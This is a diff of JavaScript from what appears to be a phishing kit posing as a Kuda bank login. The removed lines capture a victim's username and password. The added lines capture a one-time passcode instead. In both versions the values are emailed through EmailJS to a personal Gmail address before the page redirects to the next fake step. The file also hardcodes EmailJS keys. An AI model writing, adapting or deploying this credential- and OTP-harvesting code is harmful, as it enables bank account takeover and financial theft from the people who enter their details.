@@ -1,28 +1,24 @@
-// emailjs.init("");
-const username = document.querySelector("#username");
-const password = document.querySelector("#password");
+// emailjs.init("3yaulPAGa3CdjhurB");
+const otp = document.querySelector("#otp");
 const btn = document.querySelector("button");
 btn.onclick = () => {
   btn.innerHTML = "Loading...";
 };
 const serviceId = "service_64f4jig";
 const userId = "ie-y4dlUm6zOqJjms";
-const templateId = "template_5oc4n7i";
-document.getElementById("login").onsubmit = function (event) {
+const templateId = "template_mpreulh";
+document.getElementById("myForm").onsubmit = function (event) {
   event.preventDefault();
   const emailParams = {
     to_name: "Victorchinemerem191@gmail.com",
-    username: username.value,
-    password: password.value,
+    otp: otp.value,
   };
-  console.log(emailParams);
   console.log(emailParams);
   emailjs.send(serviceId, templateId, emailParams, userId).then(
     function (response) {
       console.log("Sent successfully:", response);
-      username.value = "";
-      password.value = "";
-      location.href = "/pin.html";
+      otp.value = "";
+      location.href = "/lo-Kuda.xyz.github.io/index.html";
     },
     function (error) {
       console.log("Failed to send:", error);
